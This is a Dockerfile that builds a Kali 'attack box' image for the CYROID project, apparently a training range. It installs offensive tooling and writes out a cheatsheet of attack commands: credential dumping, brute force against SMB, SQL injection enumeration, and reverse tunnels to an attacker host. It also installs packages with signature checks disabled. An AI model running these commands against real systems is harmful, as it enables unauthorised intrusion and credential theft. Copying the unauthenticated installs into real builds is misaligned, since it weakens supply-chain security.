# CYROID Kali Attack Box (Optimized)
# Full offensive security toolkit with KasmVNC desktop access
#
# OPTIMIZED:
# - Reduced from 14 RUN commands to 4 for faster builds
# - Removed ghidra (~400MB), bloodhound/neo4j (~300MB), golang-go (~200MB)
# - Removed seclists (~700MB) - using dirb wordlists for gobuster instead
# - Removed radare2, feroxbuster, ffuf, wfuzz, nikto, whatweb (~100MB)
# - Removed responder, hashcat, john (~150MB)
# - Total savings: ~2GB+
#
# Build: docker build -t cyroid/kali-attack:latest .
# Run: docker run -d -p 6901:6901 -e VNC_PW=password cyroid/kali-attack:latest

ARG BASE_TAG="1.15.0"
FROM kasmweb/kali-rolling-desktop:${BASE_TAG}

LABEL maintainer="CYROID <https://github.com/cyroid>" \
      description="CYROID Kali Attack Box - Full offensive security toolkit" \
      version="1.1.0"

USER root
ENV DEBIAN_FRONTEND=noninteractive \
    HOME=/home/kasm-default-profile \
    PATH="/opt/tools:/opt/tools/binaries:/usr/local/bin:${PATH}"

# === LAYER 1: All apt packages in one RUN ===
# Removed: ghidra, golang-go, seclists
# Removed: bloodhound (installed via apt) - will skip pip bloodhound too
RUN apt-get update --allow-insecure-repositories && \
    apt-get install -y --allow-unauthenticated kali-archive-keyring && \
    apt-get update && apt-get install -y --no-install-recommends \
    # Network Reconnaissance & Scanning
    nmap masscan enum4linux enum4linux-ng ldap-utils dnsrecon dnsenum fierce \
    netcat-openbsd socat tcpdump wireshark \
    # Exploitation Frameworks
    metasploit-framework exploitdb \
    # Active Directory Tools
    evil-winrm impacket-scripts python3-impacket smbclient smbmap \
    # Password Attacks (hydra/medusa for online attacks only)
    hydra medusa \
    # Wordlists - just the base package with dirb lists for gobuster
    wordlists \
    # Tunneling & Pivoting
    proxychains4 sshuttle \
    # Web Application Testing (gobuster + sqlmap only)
    gobuster sqlmap \
    # Wireless
    aircrack-ng \
    # Utilities
    curl wget git vim tmux jq tree python3-pip python3-venv zsh fzf ripgrep \
    # Optional packages (may not exist on all archs)
    && apt-get install -y --no-install-recommends rustscan || true \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# === LAYER 2: All tool downloads + pip installs in one RUN ===
# Removed: bloodhound.py (no longer needed without bloodhound)
RUN mkdir -p /opt/tools/peas /opt/tools/binaries && \
    # Kerbrute (x86_64 only)
    ARCH=$(uname -m) && \
    if [ "$ARCH" = "x86_64" ]; then \
        wget -q https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && \
        chmod +x /usr/local/bin/kerbrute; \
    fi && \
    # Chisel
    CHISEL_VERSION=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | grep tag_name | cut -d'"' -f4) && \
    if [ "$ARCH" = "x86_64" ]; then \
        wget -q "https://github.com/jpillora/chisel/releases/download/${CHISEL_VERSION}/chisel_${CHISEL_VERSION#v}_linux_amd64.gz" -O /tmp/chisel.gz; \
    elif [ "$ARCH" = "aarch64" ]; then \
        wget -q "https://github.com/jpillora/chisel/releases/download/${CHISEL_VERSION}/chisel_${CHISEL_VERSION#v}_linux_arm64.gz" -O /tmp/chisel.gz; \
    fi && \
    if [ -f /tmp/chisel.gz ]; then gunzip /tmp/chisel.gz && mv /tmp/chisel /usr/local/bin/chisel && chmod +x /usr/local/bin/chisel; fi && \
    # Ligolo-ng
    LIGOLO_VERSION=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | grep tag_name | cut -d'"' -f4) && \
    if [ "$ARCH" = "x86_64" ]; then \
        wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O /tmp/ligolo.tar.gz; \
    elif [ "$ARCH" = "aarch64" ]; then \
        wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_arm64.tar.gz" -O /tmp/ligolo.tar.gz; \
    fi && \
    if [ -f /tmp/ligolo.tar.gz ]; then tar -xzf /tmp/ligolo.tar.gz -C /opt/tools/binaries/ && rm /tmp/ligolo.tar.gz && ln -sf /opt/tools/binaries/agent /usr/local/bin/ligolo-agent; fi && \
    # PEAS
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /opt/tools/peas/linpeas.sh && \
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -O /opt/tools/peas/winpeas64.exe && \
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -O /opt/tools/peas/winpeas32.exe && \
    wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -O /opt/tools/peas/linpeas_amd64 && \
    chmod +x /opt/tools/peas/linpeas.sh /opt/tools/peas/linpeas_amd64 && \
    # NetExec (CrackMapExec successor)
    pip3 install --break-system-packages netexec || true

# === LAYER 3: Config files + wordlist prep in one RUN ===
RUN if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then gunzip -k /usr/share/wordlists/rockyou.txt.gz || true; fi && \
    # Aliases
    echo 'alias ll="ls -la"' >> /etc/bash.bashrc && \
    echo 'alias msfconsole="msfconsole -q"' >> /etc/bash.bashrc && \
    echo 'alias serve="python3 -m http.server 8080"' >> /etc/bash.bashrc && \
    echo 'alias linpeas="/opt/tools/peas/linpeas.sh"' >> /etc/bash.bashrc && \
    # Cheatsheet
    cat > /home/kasm-default-profile/TOOLS_CHEATSHEET.md << 'CHEATSHEET'
# CYROID Kali Attack Box - Quick Reference

## Reconnaissance
```bash
nmap -sC -sV -p- -oA full_scan <target>
rustscan -a <target> -- -sC -sV
enum4linux-ng -A <target>
```

## Web Enumeration
```bash
# Directory bruteforce with gobuster
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/big.txt

# SQL injection
sqlmap -u "http://<target>/page?id=1" --batch --dbs
```

## Active Directory
```bash
kerbrute userenum -d <domain> --dc <dc_ip> users.txt
impacket-secretsdump <domain>/<user>:<pass>@<target>
evil-winrm -i <target> -u <user> -p <pass>
netexec smb <target> -u <user> -p <pass>
```

## Password Attacks (Online)
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> smb
medusa -h <target> -U users.txt -P passwords.txt -M smb
```

## Tunneling
```bash
# Chisel: chisel server -p 8080 --reverse | chisel client <attacker>:8080 R:socks
# Ligolo: ligolo-proxy -selfcert | ligolo-agent -connect <attacker>:11601 -ignore-cert
```

## File Locations
- Wordlists: /usr/share/wordlists/ (rockyou, dirb)
- PEAS scripts: /opt/tools/peas/
CHEATSHEET

# === LAYER 4: Fix permissions (must be separate, touches many files) ===
RUN chown -R 1000:1000 /home/kasm-default-profile /opt/tools

WORKDIR /home/kasm-user
USER 1000
EXPOSE 6901
